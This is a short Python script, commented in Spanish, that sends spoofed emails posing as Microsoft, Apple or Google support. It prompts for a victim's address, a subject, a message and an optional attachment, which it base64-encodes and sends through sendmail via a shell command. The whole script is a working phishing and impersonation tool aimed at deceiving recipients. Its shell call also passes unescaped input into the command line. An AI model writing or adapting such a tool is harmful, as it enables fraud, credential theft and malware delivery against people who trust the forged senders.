import os
import base64

# Lista de remitentes falsificados
remitentes = {
    "microsoft": '"Soporte de Microsoft" <soporte@microsoft.com>',
    "apple": '"Soporte de Apple" <soporte@apple.com>',
    "google": '"Soporte de Google" <soporte@google.com>',
}

# Preguntar al usuario qué remitente usar
print("Elige un remitente falso:")
for key in remitentes:
    print(f"- {key}")

opcion = input("Escribe el nombre del remitente: ").strip().lower()
if opcion not in remitentes:
    print("❌ Opción no válida")
    exit(1)

remitente = remitentes[opcion]
destinatario = input("Correo de la víctima: ").strip()
asunto = input("Asunto del correo: ").strip()
mensaje = input("Mensaje del correo: ").strip()
adjunto = input("Ruta del archivo adjunto (deja en blanco si no hay): ").strip()

# Cabecera MIME para permitir adjuntos
boundary = "----=_MIME_BOUNDARY_"
email = f"""From: {remitente}
To: {destinatario}
Subject: {asunto}
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="{boundary}"

--{boundary}
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 7bit

{mensaje}
"""

# Si el usuario especificó un archivo adjunto, lo añadimos en base64
if adjunto:
    if not os.path.exists(adjunto):
        print("❌ El archivo adjunto no existe.")
        exit(1)

    filename = os.path.basename(adjunto)
    with open(adjunto, "rb") as f:
        encoded_content = base64.b64encode(f.read()).decode()

    email += f"""
--{boundary}
Content-Type: application/octet-stream; name="{filename}"
Content-Disposition: attachment; filename="{filename}"
Content-Transfer-Encoding: base64

{encoded_content}
"""

# Cerrar el correo MIME
email += f"\n--{boundary}--\n"

# Enviar el correo usando sendmail
sendmail_cmd = f'echo "{email}" | sendmail {destinatario}'
os.system(sendmail_cmd)

print(f"✅ Correo enviado desde {remitente} a {destinatario}")
